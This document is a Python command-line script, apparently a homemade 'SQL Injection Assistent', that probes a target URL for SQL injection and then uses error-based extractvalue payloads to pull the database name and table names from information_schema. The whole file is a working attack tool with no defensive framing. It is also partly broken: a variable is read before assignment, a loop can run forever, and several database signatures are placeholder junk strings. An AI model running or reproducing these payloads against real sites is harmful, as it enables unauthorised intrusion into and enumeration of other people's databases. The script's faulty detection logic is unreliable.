import requests, argparse
from bs4 import BeautifulSoup as BS

def Main(test, get_database_type, dbname, tablenames):
    if args.test:
        urls = [args.test + "'", args.test + '"', args.test[:-4] + ';', args.test[:-4] + ")", args.test[:-4] + "')", args.test[:-4] + '")', args.test[:-4] + '*'] 
        vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()', 'Notice: ']
        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                for vuln in vulnerable_text:
                    if vuln in data:
                        string = vuln
                        vulnerable = True
            if vulnerable:
                print('Site is vulnerable!')
        except:
            print('Site is not vulnerable!')
    elif args.tablenames:
        print("Extracting tables names...")
        link = str(args.tablenames) + " and extractvalue(1,(select%20group_concat(table_name) from%20information_schema.tables where table_schema=database()))"
        results = requests.get(link)
        data = results.text 
        str_num = str(data).find('error: ')
        str1_num = data[str_num:]
        str1 = str1_num[8:]
        str2 = str1.find('\'')
        str3 = str1[:str2]
        print("\nTable names: " + str3)
    elif args.dbname:
        link = args.dbname + " and extractvalue(1,concat(1,(select database()))) --"
        print(link)
        results = requests.get(link)
        data = results.text 
        str_num = str(data).find('error:')
        print(str_num) 
        str1_num = data[str_num:]
        str1 = str1_num[8:]
        str2 = str1.find('\'')
        str3 = str1[:str2]
        print("Database name: " + str3)
    elif args.get_database_type:
        urls = [args.get_database_type + "'", args.get_database_type + '"', args.get_database_type[:-4] + ';', args.get_database_type[:-4] + ")", args.get_database_type[:-4] + "')", args.get_database_type[:-4] + '")', args.get_database_type[:-4] + '*']
        DBDict = {
            "MySQL"             : ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()'],
            "PostGre"           : ['dafafdfds'],
            "Microsoft_SQL"     : ['dafafdfds'],
            "Oracle"            : ['dafafdfds'],
            "Advantage_Database": ['dafafdfds'],
            "Firebird"          : ['dafafdfds']  
        }
        DBFound = 0
        DBType = ''
        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                soup = BS(data, features='html.parser')
                while not DBFound:
                    for db, identifiers in DBDict.items():
                        for dbid in identifiers:
                            if dbid in data:
                                DBType = db
                                DBFound = 1
                                print(DBType)
                                break
        except:
            print('Database type: Unknown')
    else:
        print('Invalid Argument given!')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SQL Injection Assistent')
    ap = argparse.ArgumentParser(prog='sql.py', usage='%(prog)s [options] -t <Target to test for SQLI Vulnerablities>', description='SQL Injection Assistent')
    ap.add_argument('-t', '--test', type=str, help='Test Target for SQLI Vulnerablities')
    ap.add_argument('-gdt', '--get_database_type', type=str, help='Find backend DB type')
    ap.add_argument('-dbn', '--dbname', type=str, help='Get database name')
    ap.add_argument('-tn', '--tablenames', type=str, help='Get table names')
    args = ap.parse_args()
    test = args.test
    dbname = args.dbname
    tablenames = args.tablenames
    get_database_type = args.get_database_type
    Main(test, get_database_type, dbname, tablenames)
